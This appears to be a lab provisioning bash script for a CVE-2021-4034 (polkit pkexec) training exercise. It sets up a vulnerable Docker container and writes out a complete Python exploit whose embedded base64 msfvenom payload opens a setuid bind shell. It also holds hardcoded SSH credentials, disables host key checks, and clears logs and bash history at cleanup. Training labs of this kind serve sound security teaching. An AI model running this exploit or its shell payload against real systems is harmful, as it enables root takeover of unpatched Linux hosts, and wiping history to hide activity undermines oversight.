#!/usr/bin/bash
export _e_debug_logfile="/tmp/debug-$RANDOM.log";
export _e_setup_logfile="/tmp/setup-$RANDOM.log";
export _e_setup_environment="production";
export _e_setup_mode="debug";
declare -a _e_docker_dependencies=(
  "apt-transport-https"
  "ca-certificates"
  "curl"
  "software-properties-common"
);
declare -a _e_main_dependencies=(
  "net-tools"
  "docker"
  "docker.io"
  "docker-compose"
  "gcc"
  "make"
  "expect"
);

function isSudo(){
  if [[ "$EUID" -ne 0 ]]; then
    return 1;
  fi;
  return 0;
}

function logDebug() {
  local _e_msg="$(echo "[*] DEBUG: $(date) ${@}")";
  echo "${_e_msg}" >>${_e_debug_logfile};
  if [[ "$_e_setup_mode" == "debug" ]]; then
      echo "${_e_msg}";
  fi;
  return 0;
}

function logMessage() {
  local _e_msg="$(echo "[+] INFO: $(date) ${@}")";
  echo "${_e_msg}" >>${_e_debug_logfile};
  echo "${_e_msg}";
  return 0;
}

function sshExecute() {
  # sshExecute IP_ADDRESS SSH_USER SSH_PASSWORD 'ARGS'
  local _e_ip_address=$1;shift;
  local _e_ssh_user=$1;shift;
  local _e_ssh_password=$1;shift;
  expect -c "
     set timeout 5;
     spawn ssh -p 2222 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o PasswordAuthentication=yes ${_e_ssh_user}@${_e_ip_address} ${@}
     expect {
        -re \"^.*assword:*\" { send \"${_e_ssh_password}\r\"; interact}
     }
  ";
  return 0;
}

function sshUpload() {
  # sshExecute IP_ADDRESS SSH_USER SSH_PASSWORD SRC_FILE DST_FILE
  read -r _e_ip_address _e_ssh_user _e_ssh_password _e_src_file _e_dst_file<<<$(echo ${@});
  expect -c "
     set timeout 5;
     spawn scp -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o PasswordAuthentication=yes -P 2222 ${_e_src_file} ${_e_ssh_user}@${_e_ip_address}:${_e_dst_file}
     expect {
        -re \"^.*assword:*\" { send \"${_e_ssh_password}\r\"; interact}
     }
  ";
  return 0;
}

function finalizeSetup() {
  if [[ "$_e_setup_environment" != "test" ]]; then
    for _sh in $(ls /opt/CVE-2021-4034/*.sh 2>/dev/null); do
      rm ${_sh};
    done;
    if [[ "$_e_setup_mode" != "debug" ]]; then
      rm ${_e_debug_logfile};
    fi;
    rm ${_e_setup_logfile};
    for _env in $(env|grep -iaoP '^_e_([a-z0-9\_]+)'); do
      unset ${_env};
    done;
    truncate -s0 /home/ubuntu/.bash_history;
    truncate -s0 /root/.bash_history && history -c;
  else
    echo "Logs saved to: ${_e_debug_logfile} ${_e_setup_logfile}";
  fi;
  touch /tmp/.setup-complete;
  return 0;
}

function initializeSetup()  {
  logMessage "Running ${FUNCNAME[0]}";

  logDebug "Updating APT repository";
  apt update &>>${_e_debug_logfile};

  if [[ "$_e_setup_environment" == "test" ]]; then
    logDebug "Installing test environment dependencies";
    for _dependency in ${_e_docker_dependencies[@]}; do
      apt install ${_dependency} -y &>>${_e_debug_logfile};
    done;

    logDebug "Adding Docker archive to sources";
    if (! test -f /usr/share/keyrings/docker-archive-keyring.gpg); then
      (curl -fsSL https://download.docker.com/linux/ubuntu/gpg|gpg --dearmor \
        -o /usr/share/keyrings/docker-archive-keyring.gpg &>>${_e_debug_logfile});

      (echo "deb [arch=$(dpkg --print-architecture)\
        signed-by=/usr/share/keyrings/docker-archive-keyring.gpg]\
        https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"|
        sed 's/  */ /g'|tee /etc/apt/sources.list.d/docker.list &>/dev/null);

      logDebug "Updating APT with Docker repository";
      apt update &>>${_e_debug_logfile};
    fi;
  fi;

  logDebug "Installing lab dependencies";
  for _dependency in ${_e_main_dependencies[@]}; do
    apt install ${_dependency} -y &>>${_e_debug_logfile};
  done;

  logMessage "${FUNCNAME[0]} complete";
  return 0;
}

function setupDocker() {
  logMessage "Running ${FUNCNAME[0]}";
  local _e_eth0_address="$(ifconfig eth0|grep -iaoP 'inet \K([0-9\.]+)')";

  if (test "$1"); then
    logDebug "Enabling Docker with proxy settings";
    mkdir -p /etc/systemd/system/docker.service.d;
    cat << EOF >> /etc/systemd/system/docker.service.d/proxy.conf
[Service]
Environment="HTTP_PROXY=$1"
Environment="HTTPS_PROXY=$1"
Environment="NO_PROXY=localhost,127.0.0.1,::1"
EOF
    logDebug "Reloading Docker daemon";
    systemctl daemon-reload &>>${_e_debug_logfile};
    systemctl restart docker &>>${_e_debug_logfile};
  fi;

  logDebug "Creating lab directory: /opt/CVE-2021-4034";
  (mkdir -p /opt/CVE-2021-4034 &>/dev/null) & cd /opt/CVE-2021-4034;

 cat << EOF > ssh-execute.sh
#!usr/bin/bash
function sshExecute(){
  expect -c "
     set timeout 5;
     spawn ssh -p 2222 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o PasswordAuthentication=yes ubuntu@172.23.24.110 \${@}
     expect {
        -re \"^.*assword:*\" { send \"vulhub\r\"; interact}
     }
  ";
  return 0;
}
EOF

  logDebug "Creating executable file: $PWD/poc-cve-2021-4034.py";
  cat << EOF > poc-cve-2021-4034.py
#!/usr/bin/env python3
from __future__ import annotations
from ctypes.util import find_library
from ctypes import CDLL, c_char_p, Array
from os.path import exists
from os import chmod, mkdir, rmdir, remove, chdir
from base64 import b64decode
from sys import exit, stdout, stderr, argv
from argparse import Namespace, ArgumentParser


# noinspection PyBroadException
class Exploit(object):
    def __init__(self, payload: str, exploit: str, library: str, authority: str, **kw):
        self.libc: CDLL = CDLL(find_library("c"))
        self.exploit: str = exploit
        self.library: str = library
        self.authority: str = authority
        self.payload: str = payload
        self.__dict__.update(**kw)

    @property
    def environ(self) -> Array:
        environ = [
            self.exploit.encode(),
            b"PATH=GCONV_PATH=.",
            b"LC_MESSAGES=en_US.UTF-8",
            f"XAUTHORITY=../{self.authority}".encode(),
            None
        ]
        pointer = (c_char_p * len(environ))()
        pointer[:] = environ
        return pointer

    def mkdir(self, path: str) -> Exploit:
        stdout.write(f"Creating directory: {path}\n")
        if not exists(path):
            mkdir(path)
        return self

    def write(self, path: str, value: bytes = b"") -> Exploit:
        stdout.write(f"Creating file: {path}\n")
        if exists(path):
            remove(path)
        open(path, "wb").write(value)
        chmod(path, 0o0755)
        return self

    def execute(self) -> Exploit:
        try:
            stdout.write(f"Starting CVE-2021-4034 exploit\n")
            chdir("/tmp/")

            stdout.write(f"Creating shared library with payload\n")
            self.write(f"{self.library}.so", b64decode(self.payload.encode()))

            stdout.write(f"Creating exploit directories\n")
            self.mkdir("GCONV_PATH=.")\
                .mkdir(self.exploit)

            stdout.write(f"Creating exploit files\n")
            self.write(f"GCONV_PATH=./{self.exploit}", b"")\
                .write(
                    f"{self.exploit}/gconv-modules",
                    f"module  UTF-8//    INTERNAL    ../{self.library}    2\n".encode()
                )

            stdout.write(f"Executing pkexec using malformed arguments\n")
            self.libc.execve(b"/usr/bin/pkexec", c_char_p(None), self.environ)
        except Exception as err:
            stderr.write(f"Error during exploitation: {err}\n")
            exit(1)
        return self

    @staticmethod
    def main(args: Namespace) -> Exploit:
        return Exploit(
            payload=args.payload,
            exploit=args.exploit,
            library=args.library,
            authority=args.authority
        ).execute()


if __name__ == '__main__':
    options = ArgumentParser(description="CVE-2021-4034 POC", add_help=True, usage=f"python3 {argv[0]} & nc -v 127.0.0.1 65535")
    defaultPayload: str = (
        # msfvenom -p linux/x64/shell_bind_tcp lhost=0.0.0.0 lport=65535 -f elf-so prependsetuid=true|base64
        "f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAkgEAAAAAAABAAAAAAAAAALAAAAAAAAAAAAAAAEAAOAAC"
        "AEAAAgABAAEAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8AEAAAAAAABOAgAAAAAAAAAQ"
        "AAAAAAAAAgAAAAcAAAAwAQAAAAAAADABAAAAAAAAMAEAAAAAAABgAAAAAAAAAGAAAAAAAAAAABAA"
        "AAAAAAABAAAABgAAAAAAAAAAAAAAMAEAAAAAAAAwAQAAAAAAAGAAAAAAAAAAAAAAAAAAAAAIAAAA"
        "AAAAAAcAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAJABAAAAAAAAkAEAAAAAAAACAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAkgEAAAAAAAAFAAAAAAAAAJABAAAAAAAABgAAAAAA"
        "AACQAQAAAAAAAAoAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAASDH/amlYDwVqKViZagJfagFeDwVIl1LHBCQCAP//SInmahBaajFYDwVqMlgPBUgx9morWA8F"
        "SJdqA15I/85qIVgPBXX2ajtYmUi7L2Jpbi9zaABTSInnUldIieYPBQ=="
    )
    options.add_argument("-payload", action="store", default=defaultPayload, help="Base64 encoded .so payload")
    options.add_argument("-exploit", action="store", default="lab-cve-2021-4034", help="Name of exploit directory")
    options.add_argument("-library", action="store", default="lib-cve-2021-4034", help="Name of shared object")
    options.add_argument("-authority", action="store", default="PWN", help="Name of authority variable string")
    Exploit.main(options.parse_args())
    exit(0)
EOF

  logDebug "Creating file: $PWD/docker-compose.yml";
  cat << EOF > docker-compose.yml
version: '2'
services:
 cmd:
   image: vulhub/polkit:0.105
   ports:
     - 2222:2222
EOF

  logDebug "Building docker container, credentials: 'ubuntu:vulhub' SSH port: ${_e_eth0_address}:2222)";
  docker-compose up -d;

  logDebug "Setting file and folder permissions";
  chmod +x poc-cve-2021-4034.py;
  for _file in "poc-cve-2021-4034.py" "docker-compose.yml"; do
    chattr +i $PWD/${_file};
  done;
  chattr +i $PWD;

  logDebug "Setting up learner files";
  local _e_learner_path="/home/pslearner";
  test -d ${_e_learner_path}||_e_learner_path="/home/ubuntu";
  ln -s $PWD/poc-cve-2021-4034.py ${_e_learner_path}/poc-cve-2021-4034.py;

  logMessage "${FUNCNAME[0]} complete";
  return 0;
}

function runSetup() {
  logMessage "Running lab setup";

  if (! isSudo); then
    logMessage "Root privileges required";
    return 1;
  fi;

  logMessage "Initializing setup";
  if (! initializeSetup); then
    logMessage "Failed to initialize setup";
    return 1;
  fi;

  logMessage "Setting up Docker instance";
  if (! setupDocker ${1}); then
    logMessage "Failed to setup Docker instance";
    return 1;
  fi;

  logMessage "Setup complete";
  finalizeSetup;
  return 0;
}

test -f /tmp/.setup-complete||runSetup ${1}>>${_e_setup_logfile};